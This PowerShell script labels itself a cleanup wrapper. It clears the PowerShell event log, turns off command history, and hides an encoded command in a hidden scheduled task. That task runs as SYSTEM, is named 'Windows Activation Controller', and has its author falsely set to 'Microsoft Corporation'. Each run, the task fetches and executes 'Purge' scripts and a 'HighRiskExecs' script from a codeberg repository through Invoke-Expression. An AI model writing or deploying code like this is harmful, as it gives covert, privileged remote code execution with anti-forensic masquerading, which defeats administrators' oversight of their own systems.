<# Wrapper Script to cleanup core task. #>
# Variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$STName = "Windows Activation Controller"

############# Scripts starts from here.
$rawscript = @'
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$activecorepurge = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/HighRiskExecs/ActiveCoreTaskPurge.ps1"
$subfolder = "Sanitation"
$owner = "sempiampi"
$repo = "mavericks"
$uri = "https://codeberg.org/api/v1/repos/$owner/$repo/contents/$subfolder"
$response = Invoke-RestMethod -Uri $uri
$purgeFiles = @()
foreach ($item in $response) {
    if ($item.type -eq "file" -and $item.name -like "*Purge*") {
        $purgeFiles += "https://codeberg.org/$owner/$repo/raw/branch/main/$($item.path)"
    }
}
foreach ($purgeFile in $purgeFiles) {
    try {
        Invoke-Expression (Invoke-WebRequest -uri $purgeFile -UseBasicParsing).content
    } catch {
    }
}
Start-Sleep 10 | Out-Null
Invoke-Expression (Invoke-WebRequest -Uri $activecorepurge -UseBasicParsing).Content
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawscript)
$enccmd = [Convert]::ToBase64String($bytes)

$STAction = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-NoProfile -WindowStyle Hidden -EncodedCommand $enccmd"

$STTrigger = New-ScheduledTaskTrigger `
    -Once `
    -At ([DateTime]::Now.AddMinutes(1)) `
    -RepetitionInterval (New-TimeSpan -Minutes 5) `
    -RepetitionDuration (New-TimeSpan -Days 1)

$STSettings = New-ScheduledTaskSettingsSet `
    -Compatibility Win8 `
    -MultipleInstances IgnoreNew `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -Hidden 

if (Get-ScheduledTask -TaskName $STName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $STName -Confirm:$false
}

Register-ScheduledTask -Action $STAction -Trigger $STTrigger -Settings $STSettings -TaskName $STName -Description "Cleans up the system." -User "NT AUTHORITY\SYSTEM" -RunLevel Highest | Out-Null
$TargetTask = Get-ScheduledTask -TaskName $STName -ErrorAction SilentlyContinue
$TargetTask.Author = 'Microsoft Corporation'
$TargetTask.Triggers[0].StartBoundary = [DateTime]::Now.AddMinutes(1).ToString("yyyy-MM-dd'T'HH:mm:ss")
$TargetTask.Triggers[0].EndBoundary = [DateTime]::Now.AddMinutes(10).ToString("yyyy-MM-dd'T'HH:mm:ss")
$TargetTask.Settings.AllowHardTerminate = $True
$TargetTask.Settings.DeleteExpiredTaskAfter = 'PT10M'
$TargetTask.Settings.ExecutionTimeLimit = 'PT1H'
$TargetTask.Settings.volatile = $False
$TargetTask | Set-ScheduledTask | Out-Null